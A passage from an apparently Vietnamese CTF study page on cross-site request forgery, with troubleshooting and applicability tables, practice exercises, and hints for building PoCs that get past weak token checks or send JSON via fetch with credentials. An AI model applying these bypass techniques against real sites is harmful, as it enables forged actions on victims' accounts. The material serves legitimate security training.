+    <tr><td>Request bị từ chối dù không có token</td><td>App có check <code>SameSite=Strict/Lax</code> trên cookie, hoặc check Origin/Referer</td><td>Kiểm tra response header <code>Set-Cookie</code> có SameSite không; nếu có Strict thì CSRF cổ điển gần như không khả thi, cần tìm hướng khác</td></tr>
+    <tr><td>Form tự submit nhưng admin bot không ghé qua</td><td>Sai cách report URL, hoặc trang PoC lỗi JavaScript không chạy được <code>onload</code></td><td>Tự mở file PoC bằng trình duyệt thật trước để xác nhận nó TỰ submit đúng, trước khi báo cho bot</td></tr>
+    <tr><td>PoC chạy nhưng request tới TARGET trả lỗi CORS</td><td>Nhầm lẫn CSRF với CORS — CSRF dùng form/thẻ HTML (không bị CORS chặn vì không cần ĐỌC response), nếu dùng <code>fetch()</code> mà cần đọc kết quả thì mới bị CORS chặn</td><td>Nếu chỉ cần GỬI request (không cần đọc response), dùng form HTML thay vì fetch; fetch chỉ cần khi cần POST JSON (mục 06.C) và không cần đọc lại response</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / NHẬN DIỆN & GIỚI HẠN</div>
+  <h2>Khi nào ĐƯỢC / KHÔNG dùng</h2>
+  <table>
+    <tr><th></th><th>Tình huống</th></tr>
+    <tr><td>✅</td><td>Chức năng đổi trạng thái chỉ dựa vào cookie, không CSRF token, cookie không có <code>SameSite=Strict</code>.</td></tr>
+    <tr><td>❌</td><td>App có CSRF token được validate đúng cách (server so sánh với giá trị lưu theo session).</td></tr>
+    <tr><td>❌</td><td>Cookie có <code>SameSite=Strict</code> (trình duyệt tự chặn gửi cookie cross-site, không cần code app làm gì thêm) — hầu hết trình duyệt hiện đại mặc định <code>Lax</code>, vẫn chặn được 1 phần CSRF qua GET đơn giản.</td></tr>
+    <tr><td>❌</td><td>Không có admin bot/nạn nhân nào mở được trang PoC của bạn.</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 13 -->
+<section class="block" id="s13">
+ <div class="wrap">
+  <div class="secnum">13 / BÀI TẬP & THUẬT NGỮ</div>
+  <h2>Luyện tập</h2>
+  <p>⭐ <strong>Làm lại:</strong> dựng ví dụ mục 09 bằng tay, từ bắt request đổi email, Burp sinh PoC, tới khi
+  admin bot "mắc bẫy".</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Luôn tự test PoC bằng trình duyệt thật của mình trước khi report cho
+  bot — bot chỉ thử 1 lần, không có cơ hội sửa lỗi JS giữa chừng.</details>
+
+  <p>⭐⭐ <strong>Đổi 1 biến:</strong> app có CSRF token nhưng chỉ kiểm tra token CÓ TỒN TẠI trong request, không
+  so khớp giá trị đúng với session. Viết PoC khai thác lỗ hổng validate yếu này.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Thêm field token với giá trị bất kỳ (vd <code>"x"</code>) vào form PoC
+  — nếu server chỉ check "có mặt", request vẫn qua.</details>
+
+  <p>⭐⭐⭐⭐ <strong>Tự nghĩ:</strong> endpoint chỉ nhận <code>Content-Type: application/json</code> (từ chối
+  form-urlencoded) — form HTML thường không set được Content-Type này. Thiết kế payload PoC vẫn gửi được JSON
+  qua CSRF.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Dùng <code>&lt;script&gt;fetch(...)&lt;/script&gt;</code> với
+  <code>credentials: 'include'</code> thay vì thẻ <code>&lt;form&gt;</code> — xem mục 06.C.</details>
+
+  <h2>Thuật ngữ</h2>
+  <table>
+    <tr><td>CSRF</td><td>Cross-Site Request Forgery — ép nạn nhân gửi request tới app đích mà không hề biết, nhờ trình duyệt tự đính kèm cookie.</td></tr>
+    <tr><td>CSRF token</td><td>Chuỗi ngẫu nhiên duy nhất xác nhận request thật sự xuất phát từ trang hợp lệ.</td></tr>
+    <tr><td>SameSite cookie</td><td>Thuộc tính cookie giới hạn việc gửi kèm cookie khi request bắt nguồn từ domain khác.</td></tr>
+    <tr><td>Same-Origin Policy</td><td>Quy tắc trình duyệt: JS chỉ đọc được dữ liệu cùng origin, nhưng vẫn được phép GỬI request cross-origin.</td></tr>
+  </table>
+  <p style="margin-top:16px"><strong>Công cụ/tài liệu offline:</strong> Burp "Generate CSRF PoC" (có sẵn),
+  <code>~/hoc/CTF/Tools/web/PayloadsAllTheThings/Cross-Site Request Forgery/</code>, Python <code>http.server</code>.</p>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p>Chỉ dùng cho học tập &amp; thi CTF hợp pháp, trong phạm vi được cấp phép (F-Hacker 2026 Bảng C và tương tự).</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("csrf-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("csrf-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+})();
+</script>
